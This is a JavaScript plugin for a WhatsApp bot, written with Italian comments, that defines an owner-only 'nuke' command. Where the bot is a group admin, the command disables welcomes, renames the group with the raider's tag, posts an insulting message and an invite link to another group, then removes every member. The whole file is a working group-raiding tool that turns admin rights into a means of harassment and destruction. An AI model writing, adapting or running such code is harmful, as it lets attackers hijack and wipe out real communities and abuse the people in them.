let handler = async (m, { conn, groupMetadata, participants, command, isBotAdmin }) => {
    let bot = global.db.data.settings[conn.user.jid] || {};
    const chat = global.db.data.chats[m.chat];

    const utenti = participants.map(u => u.id).filter(id => id !== conn.user.jid);
    const delay = ms => new Promise(res => setTimeout(res, ms));

    if (!utenti.length || !isBotAdmin || !bot.restrict) return;

    switch (command) {
        case "nuke":
            // 🔕 Disattiva il benvenuto
            chat.welcome = false;

            // 📛 Cambia il nome del gruppo
            try {
                await conn.groupUpdateSubject(m.chat, 'nukk by ꪶ⃬𝟐𝟐𝟐ꫂ 𝐁𝚯𝐓');
            } catch (e) {
                console.error("Errore nel cambiare il nome del gruppo:", e);
            }

            
            await conn.sendMessage(m.chat, {
                text: "✧ COGLIONI VI HO FOTTUTO😓 ꪶ⃬𝟐𝟐𝟐ꫂ 𝐁𝚯𝐓"
            });

            await conn.sendMessage(m.chat, {
                text: 'ENTRATE TUTTI QUA:\nhttps://chat.whatsapp.com/I6NriiS293m8KHYPeyPVxy'
            });

            // 👢 Rimuove tutti
            try {
                await delay(500);
                await conn.groupParticipantsUpdate(m.chat, utenti, 'remove');
            } catch (e) {
                console.error("Errore nella rimozione:", e);
            }
            break;
    }
};

handler.command = ['nuke'];
handler.group = true;
handler.owner = true;
handler.fail = null;

export default handler;